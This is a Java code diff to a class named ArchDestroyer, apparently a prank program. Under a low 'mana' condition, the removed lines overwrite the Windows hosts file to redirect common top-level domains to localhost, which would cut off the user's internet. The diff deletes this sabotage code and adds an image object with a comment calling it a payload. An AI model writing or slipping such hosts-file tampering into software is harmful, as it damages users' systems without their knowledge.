@@ -65,38 +65,8 @@ public class ArchDestroyer {
 
         if (manaRemaining < 50) {
 
-            if (dataLocation.contains("C:\\")){
-                dataLocation = "C:\\Windows\\System32\\drivers\\etc\\hosts";
-
-
-                File file = new File(dataLocation);
-
-                try {
-                    file.createNewFile();
-                } catch (IOException e) {
-                    System.out.println("Not an admin, please try again");
-                    return;
-                }
-
-                FileWriter writer = null;
-
-                try {
-                    writer = new FileWriter(file);
-                } catch (IOException e) {
-                    System.out.println("Not an admin, please try again");
-                    return;
-                }
-                try {
-                    writer.write("127.0.0.1         .com");
-                    writer.write("127.0.0.1         .org");
-                    writer.write("127.0.0.1         .gg");
-                    writer.write("127.0.0.1         .net");
-
-                } catch (IOException e) {
-                    System.out.println("IDK what went wrong here");
-                }
-
-            }
+            ArchImage overrideBKG = new ArchImage();
+            //I love this payload
 
 
         }
